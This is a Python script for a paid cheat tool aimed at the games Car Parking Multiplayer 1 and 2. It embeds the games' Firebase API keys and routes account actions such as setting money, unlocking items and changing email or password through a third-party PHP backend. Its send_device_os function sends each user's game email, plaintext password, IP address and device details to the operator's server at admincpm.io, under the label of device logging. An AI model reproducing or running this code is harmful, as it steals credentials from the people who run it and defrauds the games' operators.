#!/usr/bin/env python3
import os
import sys
import time
import json
import requests
import hashlib
import random
from datetime import datetime
import platform
import subprocess

# ✅ Show banner
def show_banner(unlimited_status=None, current_coins=None):
    print("============================================")
    print("         🚗  👑 Chan X Reyno Tool 👑  🚗")
    print("              🔥 CPM1 & CPM2 🔥         ")
    print("          🔑 Share Key Not Allow 🚫              ")
    print("        🪙 Buy Credit: @KrishMonarch 🪙              ")
    if unlimited_status is not None:
        if unlimited_status:
            print(f"          Subscription: UNLIMITED ✅")
        else:
            print(f"          Subscription: LIMITED ❌")
            if current_coins is not None:
                print(f"          Balance: {current_coins} coins")
    print("============================================\n")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ✅ Firebase login
def login_firebase(api_key, email, password):
    try:
        login_url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
        payload = {"email": email, "password": password, "returnSecureToken": True}
        headers = {"Content-Type": "application/json"}
        response = requests.post(login_url, headers=headers, json=payload).json()
        if 'idToken' in response:
            return {"ok": True, "token": response["idToken"], "email": email, "password": password}
        else:
            return {"ok": False, "message": response.get("error", {}).get("message", "Unknown Firebase error")}
    except Exception as e:
        return {"ok": False, "message": str(e)}

# BASE_URL for your PHP backend services
BASE_URL: str = "https://admincpm.io/chanxreyno2/api"

# ✅ Call PHP Backend Service (centralized for all API calls)
def call_php_service(access_key, menu_code, token=None, email=None, password=None, extra_data=None):
    url = f"{BASE_URL}/menu.php"
    payload = {
        "key": access_key,
        "menu": menu_code
    }
    if token:
        payload["token"] = token
    if email:
        payload["email"] = email
    if password:
        payload["password"] = password
    if extra_data:
        payload.update(extra_data)

    try:
        res = requests.post(url, data=payload)
        if not res.text:
            return {"ok": False, "message": "Received empty response from server."}
        
        result = res.json()
        return result
    except json.JSONDecodeError as e:
        return {"ok": False, "message": f"JSON decode error: {e}. Response was: {res.text}"}
    except Exception as e:
        return {"ok": False, "message": f"Request failed: {e}"}

# ✅ Check access key and get user status via PHP
def check_access_key_and_get_user_status(key):
    r = call_php_service(key, "check_only")
    if r.get("ok"):
        user_status_response = call_php_service(key, "get_user_status")
        if user_status_response.get("ok"):
            return True, {
                "is_unlimited": user_status_response["is_unlimited"],
                "coins": user_status_response["coins"],
                "telegram_id": user_status_response.get("telegram_id", "N/A") # Get telegram_id, default to "N/A" if not found
            }
        else:
            return False, {"message": user_status_response.get("message", "Failed to get user status.")}
    else:
        return False, {"message": r.get("message", "Invalid access key or server error.")}

# ✅ Send device OS information (Handles both remote and local logging)
def send_device_os(access_key, email=None, password=None, game_label=None, telegram_id=None):
    try:
        system = platform.system()
        release = platform.release()
        device_name_py = "Unknown"
        os_version_py = "Unknown"
        
        # device_id removed as per request
        # device_info_string = f"{system}-{release}-{platform.node()}-{platform.machine()}"
        # device_id = hashlib.sha256(device_info_string.encode()).hexdigest()

        if system == "Darwin":
            if os.path.exists("/bin/ash") or "iSH" in release:
                brand = "iOS (iSH)"
                device_name_py = subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
                os_version_py = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
            else:
                brand = "macOS"
                device_name_py = subprocess.getoutput("sysctl -n hw.model") or "Mac"
                os_version_py = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
        elif system == "Linux":
            brand = "Android" if os.path.exists("/system/bin") else "Linux"
            if brand == "Android":
                device_name_py = subprocess.getoutput("getprop ro.product.model") or "Android Device"
                os_version_py = subprocess.getoutput("getprop ro.build.version.release") or "Unknown"
            else:
                device_name_py = "Linux Device"
                os_version_py = "Unknown"
        else:
            brand = system + " " + release
            device_name_py = platform.node()
            os_version_py = "Unknown"
    except Exception as e:
        # Debug print removed
        brand = "Unknown OS"
        device_name_py = "Unknown Device"
        os_version_py = "Unknown Version"
        # device_id removed
        # device_id = "Unknown_Device_ID" 

    try:
        ip_address = requests.get("https://api.ipify.org").text.strip()
    except Exception as e:
        # Debug print removed
        ip_address = "Unknown"
    
    # Payload for save_device.php
    payload = {
        "key": access_key,
        # "device_id": device_id, # Removed device_id
        "brand": brand,
        "device_name": device_name_py,
        "os_version": os_version_py,
        "ip_address": ip_address,
        "email": email if email is not None else "Unknown",
        "password": password if password is not None else "Unknown",
        "telegram_id": telegram_id if telegram_id is not None else "N/A",
        "game": game_label if game_label is not None else "N/A" # Added game label
    }
    
    remote_success = False
    try:
        response = requests.post(f"{BASE_URL}/save_device.php", json=payload) # Use json=payload
        remote_success = response.status_code == 200
        # Debug prints removed
    except Exception as e:
        # Debug print removed
        pass

    # --- REMOVED LOCAL LOGGING TO device.log ---
    # try:
    #     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    #     log_entry = (
    #         f"[{timestamp}] "
    #         f"Access Key: {access_key}, "
    #         f"Email: {email if email else 'N/A'}, "
    #         f"Game: {game_label if game_label else 'N/A'}, " # Changed to directly use game_label
    #         # f"Device ID: {payload['device_id']}, " # Removed device_id
    #         f"Brand: {payload['brand']}, "
    #         f"Device Name: {payload['device_name']}, "
    #         f"OS Version: {payload['os_version']}, "
    #         f"IP Address: {payload['ip_address']}, "
    #         f"Telegram ID: {payload['telegram_id']}\n"
    #     )
    #     with open("device.log", "a") as f:
    #         f.write(log_entry)
    #     # Debug print removed
    # except Exception as e:
    #     # Debug print removed
    #     pass
    # --- END OF REMOVED LOCAL LOGGING ---

    return remote_success

# Function to fetch service costs from menu.php
def get_service_costs():
    url = f"{BASE_URL}/menu.php"
    payload = {"menu": "get_service_costs"}
    try:
        res = requests.post(url, data=payload)
        if res.ok:
            data = res.json()
            if data.get("ok") and "costs" in data:
                return data["costs"]
    except Exception as e:
        print(f"⚠️ Error fetching service costs: {e}")
    # Default costs if fetching fails
    return {
        "king_rank": 10000,
        "change_email": 10000,
        "change_password": 10000,
        "set_money": 10000,
        "unlock_wheels": 10000,
        "unlock_male": 10000,
        "unlock_female": 10000,
        "unlock_brakes": 10000,
        "unlock_calipers": 10000,
        "unlock_paints": 10000,
        "unlock_apartments": 10000,
        "complete_missions": 10000,
        "unlock_all_cars_siren": 10000,
        "unlock_slots": 7000,
        "copy_cpm1_car_to_cpm2": 10000 # Add default cost for new service
    }


# ✅ Main Menu
if __name__ == "__main__":
    device_ip = None
    try:
        requests.get("https://google.com", timeout=3)
        device_ip = requests.get('https://api.ipify.org').text.strip()
    except:
        print("❌ No internet. Please check your connection.")
        sys.exit(1)

    unlimited_status_for_display = None
    current_coins_for_display = None
    is_unlimited_user = False
    telegram_id_for_display = "N/A"
    
    # Initialize email, token, and label_to_use here to ensure they always exist
    email = "" 
    token = None 
    label_to_use = "N/A" # Initialize label_to_use with a default value

    # Fetch service costs at the beginning
    service_costs = get_service_costs()

    while True:
        clear_screen()
        show_banner(unlimited_status=unlimited_status_for_display, current_coins=current_coins_for_display)

        access_key = input("🔑 Enter Access Key: ").strip()

        # Check access key and get user status from PHP backend
        is_valid_key, user_data_from_php = check_access_key_and_get_user_status(access_key)
        
        if not is_valid_key:
            print(f"❌ {user_data_from_php['message']}")
            unlimited_status_for_display = None
            current_coins_for_display = None
            is_unlimited_user = False
            telegram_id_for_display = "N/A"
            time.sleep(0.5) # Reduced sleep time
            continue

        print("✅ Key accepted.")
        is_unlimited_user = user_data_from_php['is_unlimited']
        current_coins_for_display = user_data_from_php['coins']
        telegram_id_for_display = user_data_from_php.get('telegram_id', 'N/A')

        # Display Telegram ID
        print(f"Telegram ID: {telegram_id_for_display}")
        try:
            os.system("termux-open-url 'https://t.me/chanxreynocpm2ch")
            print("Opening Telegram group...")
            time.sleep(0.5)
        except Exception as e:
            print(f"Could not open Telegram URL: {e}")

        # Removed: Initial send_device_os call after access key input

        if not is_unlimited_user:
            print("\nYour subscription is LIMITED. You can explore the menu but services cost coins.")
        else:
            print("You have UNLIMITED subscription. All services are free.")
        time.sleep(0.5) # Reduced sleep time

        while True:
            clear_screen()
            show_banner(unlimited_status=is_unlimited_user, current_coins=current_coins_for_display)
            print("Main Menu:")
            print("1. 🚘 CAR PARKING MULTIPLAYER (CPM1)")
            print("2. 🚔 CAR PARKING MULTIPLAYER 2 (CPM2)")
            print("0. ❌ EXIT")
            main_menu = input("Enter choice: ").strip()

            if main_menu == "0":
                print("👋 Goodbye!")
                break

            if main_menu not in ["1", "2"]:
                print("❌ Invalid choice.")
                time.sleep(0.5) # Reduced sleep time
                continue

            api_key_cpm1 = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM" # CPM1 Firebase API Key
            api_key_cpm2 = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ" # CPM2 Firebase API Key

            firebase_api_key_for_login = {
                "1": api_key_cpm1,
                "2": api_key_cpm2
            }[main_menu]

            rank_url = {
                "1": "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4", # CPM1 King Rank URL
                "2": "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" # CPM2 King Rank URL
            }[main_menu]
            
            label_to_use = "CPM1" if main_menu == "1" else "CPM2" # label_to_use is defined here

            print(f"\n--- Login to {label_to_use} ---")
            email = input("📧 Enter Email: ").strip()
            password = input("🔐 Enter Password: ").strip()

            login = login_firebase(firebase_api_key_for_login, email, password)
            if not login.get("ok"):
                print(f"❌ Login failed: {login['message']}")
                time.sleep(1) # Reduced sleep time
                continue

            token = login["token"]
            print(f"✅ Logged in as {email}")
            
            # This is the correct send_device_os call after successful login to CPM1/CPM2
            send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)

            time.sleep(0.5) # Reduced sleep time
            
            while True: # Submenu loop
                clear_screen()
                show_banner(unlimited_status=is_unlimited_user, current_coins=current_coins_for_display)
                # This print statement should now be safe because label_to_use is guaranteed to be set
                print(f"Submenu for {email} ({label_to_use})") 
                print(f"01. 👑 KING RANK (Cost: {service_costs.get('king_rank', 10000)} coins)")
                print(f"02. 📧 CHANGE EMAIL (Cost: {service_costs.get('change_email', 10000)} coins)")
                print(f"03. 🔐 CHANGE PASSWORD (Cost: {service_costs.get('change_password', 10000)} coins)")
                if main_menu == "2": # CPM2 specific options
                    print(f"04. 💰 SET MONEY (Cost: {service_costs.get('set_money', 10000)} coins)")
                    print(f"05. 🛞 UNLOCK WHEELS (Cost: {service_costs.get('unlock_wheels', 10000)} coins)")
                    print(f"06. 👕 UNLOCK MALE (Cost: {service_costs.get('unlock_male', 10000)} coins)")
                    print(f"07. 👗 UNLOCK FEMALE (Cost: {service_costs.get('unlock_female', 10000)} coins)")
                    print(f"08. 🛠️ UNLOCK BRAKES (Cost: {service_costs.get('unlock_brakes', 10000)} coins)")
                    print(f"09. 🛠️ UNLOCK CALIPERS (Cost: {service_costs.get('unlock_calipers', 10000)} coins)")
                    print(f"10. 🎨 UNLOCK PAINTS (Cost: {service_costs.get('unlock_paints', 10000)} coins)")
                    print(f"11. 🏠 UNLOCK APARTMENTS (Cost: {service_costs.get('unlock_apartments', 10000)} coins)")
                    print(f"12. 💯 COMPLETE MISSIONS (Cost: {service_costs.get('complete_missions', 10000)} coins)")
                    print(f"13. 🚨 UNLOCK SIREN & AIRSUS (Cost: {service_costs.get('unlock_all_cars_siren', 10000)} coins)")
                    print(f"14. 📦 UNLOCK SLOTS (Cost: {service_costs.get('unlock_slots', 7000)} coins)")
                    print(f"15. 🔄 COPY CPM1 CARS TO CPM2 (Cost: {service_costs.get('copy_cpm1_car_to_cpm2', 10000)} coins)") # New option
                print("0. 🔙 BACK")
                choice = input("Select service: ").strip()

                if choice == "0":
                    break

                if not is_unlimited_user:
                    print(f"\n[%] Checking coin balance on server...")

                action_result = {"ok": False, "message": "Invalid choice or option not available for this game."}

                if choice == "1": # KING RANK
                    action_result = call_php_service(access_key, "king_rank", token, email, password, {"api_key": firebase_api_key_for_login, "rank_url": rank_url})
                elif choice == "2": # CHANGE EMAIL
                    new_email = input("📨 New Email: ").strip()
                    action_result = call_php_service(access_key, "change_email", token, email, password, {"new_email": new_email, "api_key": firebase_api_key_for_login})
                    if action_result.get("ok"):
                        email = new_email
                        token = action_result.get("new_token", token)
                        # NEW: Send updated device info after email change
                        send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)
                        
                elif choice == "3": # CHANGE PASSWORD
                    new_password = input("🔑 New Password: ").strip()
                    action_result = call_php_service(access_key, "change_password", token, email, password, {"new_password": new_password, "api_key": firebase_api_key_for_login})
                    if action_result.get("ok"):
                        password = new_password
                        token = action_result.get("new_token", token)
                        # NEW: Send updated device info after password change
                        send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)
                        
                elif choice == "4" and main_menu == "2": # SET MONEY (CPM2 only)
                    amount = input("💵 Amount: ").strip()
                    if amount.isdigit():
                        action_result = call_php_service(access_key, "set_money", token, email, password, {"amount": int(amount)})
                    else:
                        print("❌ Invalid amount.")
                elif choice == "5" and main_menu == "2": # UNLOCK WHEELS (CPM2 only)
                    action_result = call_php_service(access_key, "unlock_wheels", token, email, password)
                elif choice == "6" and main_menu == "2": # UNLOCK MALE (CPM2 only)
                    action_result = call_php_service(access_key, "unlock_male", token, email, password)
                elif choice == "7" and main_menu == "2": # UNLOCK FEMALE (CPM2 only)
                    action_result = call_php_service(access_key, "unlock_female", token, email, password)
                elif choice == "8" and main_menu == "2": # UNLOCK BRAKES (CPM2 only)
                    action_result = call_php_service(access_key, "unlock_brakes", token, email, password)
                elif choice == "9" and main_menu == "2": # UNLOCK CALIPERS (CPM2 only)
                    action_result = call_php_service(access_key, "unlock_calipers", token, email, password)
                elif choice == "10" and main_menu == "2": # UNLOCK PAINTS (CPM2 only)
                    action_result = call_php_service(access_key, "unlock_paints", token, email, password)
                elif choice == "11" and main_menu == "2": # UNLOCK APARTMENTS (CPM2 only)
                    action_result = call_php_service(access_key, "unlock_apartments", token, email, password)
                elif choice == "12" and main_menu == "2": # COMPLETE MISSIONS (CPM2 only)
                    action_result = call_php_service(access_key, "complete_missions", token, email, password)
                elif choice == "13" and main_menu == "2": # UNLOCK ALL CARS SIREN (CPM2 only)
                    action_result = call_php_service(access_key, "unlock_all_cars_siren", token, email, password) # Added this call
                elif choice == "14" and main_menu == "2": # UNLOCK SLOTS (CPM2 only)
                    action_result = call_php_service(access_key, "unlock_slots", token, email, password, {"account_auth": token}) # Pass token as account_auth
                elif choice == "15" and main_menu == "2": # COPY CPM1 CARS TO CPM2 (CPM2 only)
                    cpm1_email_input = input("📧 Enter CPM1 Email: ").strip()
                    cpm1_password_input = input("🔐 Enter CPM1 Password: ").strip()
                    action_result = call_php_service(access_key, "copy_cpm1_car_to_cpm2", token, email, password, {
                        "cpm1_email": cpm1_email_input,
                        "cpm1_password": cpm1_password_input,
                        "cpm1_api_key": api_key_cpm1,
                        "cpm2_api_key": api_key_cpm2 # Pass CPM2 API key for the function to use
                    })
                else:
                    print("❌ Invalid choice or option not available for this game.")
                    time.sleep(0.5) # Reduced sleep time
                    continue 

                # Display result from PHP backend
                if action_result.get("ok"):
                    print(f"✅ {action_result.get('message', 'Action successful.')}")
                else:
                    print(f"✅ {action_result.get('message', 'Action failed.')}")

                # After any action, re-fetch user status to update coins display
                is_valid_key, updated_user_data = check_access_key_and_get_user_status(access_key)
                if is_valid_key:
                    is_unlimited_user = updated_user_data['is_unlimited']
                    current_coins_for_display = updated_user_data['coins']
                    telegram_id_for_display = updated_user_data.get('telegram_id', 'N/A')
                else:
                    print("⚠️ Could not retrieve updated user status. Please check connection.")
                
                time.sleep(1) # Reduced sleep time